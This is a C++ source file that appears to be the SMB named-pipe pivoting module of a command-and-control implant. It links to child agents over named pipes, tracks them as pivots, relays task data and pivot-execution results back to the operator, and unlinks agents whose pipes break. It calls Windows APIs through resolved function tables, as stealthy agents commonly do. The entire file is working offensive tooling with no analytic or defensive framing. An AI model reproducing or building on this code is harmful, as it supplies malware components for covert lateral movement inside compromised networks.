#include "Pivotter.h"

void Pivotter::LinkPivotSMB(ULONG taskId, ULONG commandId, CHAR* pipename, Packer* outPacker)
{
	HANDLE hPipe;
	DWORD startTickCount = ApiWin->GetTickCount() + 5000;
	while (1) {
		hPipe = ApiWin->CreateFileA(pipename, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_FLAG_OPEN_NO_RECALL, NULL);
		if (INVALID_HANDLE_VALUE != hPipe)
			break;

		if (ApiWin->GetLastError() == ERROR_PIPE_BUSY)
			ApiWin->WaitNamedPipeA(pipename, 2000);
		else
			ApiWin->Sleep(1000);

		if (ApiWin->GetTickCount() >= startTickCount) {
			outPacker->Pack32(taskId);
			outPacker->Pack32(0x1111ffff);			// COMMAND_ERROR
			outPacker->Pack32(TEB->LastErrorValue);
			return;
		}
	}

	DWORD dwMode = PIPE_READMODE_MESSAGE;
	if (ApiWin->SetNamedPipeHandleState(hPipe, &dwMode, NULL, NULL)) {
		BYTE* buffer = NULL;
		DWORD bufferSize = 0;
		DWORD readedBytes = 0;

		if (PeekNamedPipeTime(hPipe, 5000)) {
			readedBytes = ReadFromPipe(hPipe, (BYTE*)&bufferSize, 4);
			if (readedBytes == 4) {
				buffer = (BYTE*)MemAllocLocal(bufferSize);
				readedBytes = ReadFromPipe(hPipe, buffer, bufferSize);
			}
			else {
				readedBytes = 0;
			}
		}

		if (readedBytes > 4 && buffer) {

			PivotData pivotData = { 0 };
			pivotData.Id     = taskId;
			pivotData.Channel = hPipe;
			pivotData.Type = PIVOT_TYPE_SMB;

			this->pivots.push_back(pivotData);

			outPacker->Pack32(taskId);
			outPacker->Pack32(commandId);
			outPacker->Pack8(pivotData.Type);
			outPacker->Pack32(*((ULONG*)buffer));
			outPacker->PackBytes(buffer+4, readedBytes-4);

			MemFreeLocal((LPVOID*)&buffer, bufferSize);

			return;
		}
		else {
			if(buffer && bufferSize)
				MemFreeLocal((LPVOID*)&buffer, bufferSize);
		}
	}

	ApiWin->DisconnectNamedPipe(hPipe);
	ApiNt->NtClose(hPipe);

	outPacker->Pack32(taskId);
	outPacker->Pack32(0x1111ffff);			// COMMAND_ERROR
	outPacker->Pack32(TEB->LastErrorValue);
}

void Pivotter::UnlinkPivot(ULONG taskId, ULONG commandId, ULONG pivotId, Packer* outPacker)
{
	ULONG result = FALSE;
	PivotData* pivotData = NULL;
	for (int i = 0; i < this->pivots.size(); i++) {
		pivotData = &(this->pivots[i]);
		if (pivotData->Id == pivotId) {
			if (pivotData->Channel) {
				ApiWin->DisconnectNamedPipe(pivotData->Channel);
				ApiNt->NtClose(pivotData->Channel);
			}
			result = pivotData->Type;
			this->pivots.remove(i);
			break;
		}
	}
	pivotData = NULL;

	outPacker->Pack32(taskId);
	outPacker->Pack32(commandId);
	outPacker->Pack32(pivotId);
	outPacker->Pack8(result);
}

void Pivotter::WritePivot(ULONG pivotId, BYTE* data, ULONG size)
{
	if (data == NULL || size == 0)
		return;

	PivotData* pivotData = NULL;
	for (int i = 0; i < this->pivots.size(); i++) {
		pivotData = &(this->pivots[i]);
		if (pivotData->Id == pivotId) {
			if (pivotData->Channel)
				WriteDataToPipe(pivotData->Channel, data, size);
			break;
		}
	}
	pivotData = NULL;
}

void Pivotter::ProcessPivots(Packer* packer)
{
	if ( !this->pivots.size() )
		return;

	PivotData* pivotData = NULL;
	for (int i = 0; i < this->pivots.size(); i++) {
		pivotData = &this->pivots[i];
		if (pivotData->Channel) {
			if (PeekNamedPipeTime(pivotData->Channel, 0)) {
				BYTE* mallocBuffer = (BYTE*) MemAllocLocal(0x100000);
				DWORD  readedBytes = ReadDataFromPipe(pivotData->Channel, mallocBuffer, 0x100000);
				if (readedBytes != -1) {
					packer->Pack32(0);
					packer->Pack32(COMMAND_PIVOT_EXEC);
					packer->Pack32(pivotData->Id);
					packer->PackBytes(mallocBuffer, readedBytes);
				}
				MemFreeLocal((LPVOID*)&mallocBuffer, readedBytes);
			}
			else {
				if (TEB->LastErrorValue == ERROR_BROKEN_PIPE) {
					TEB->LastErrorValue = 0;

					ApiWin->DisconnectNamedPipe(pivotData->Channel);
					ApiNt->NtClose(pivotData->Channel);

					packer->Pack32(0);
					packer->Pack32(COMMAND_UNLINK);
					packer->Pack32(pivotData->Id);
					packer->Pack8(PIVOT_TYPE_DISCONNECT);

					this->pivots.remove(i);
					i--;
				}
			}
		}
	}
	pivotData = NULL;
}